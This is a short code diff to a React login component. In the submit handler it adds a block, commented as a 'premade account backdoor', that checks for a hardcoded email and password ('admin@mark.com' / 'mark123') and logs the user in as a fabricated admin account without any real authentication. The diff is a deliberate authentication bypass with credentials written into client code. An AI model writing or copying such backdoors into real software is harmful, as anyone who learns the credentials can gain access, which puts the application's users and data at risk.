@@ -16,6 +16,17 @@ export const LoginView: React.FC<LoginViewProps> = ({ onLogin, onEnterGuest }) =
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+
+    // Premade account backdoor
+    if (email === 'admin@mark.com' && password === 'mark123') {
+      onLogin({
+        id: 'premade-admin-123',
+        email: 'admin@mark.com',
+        user_metadata: { name: 'Admin Mark' }
+      });
+      return;
+    }
+
     setLoading(true);
     setError(null);
     
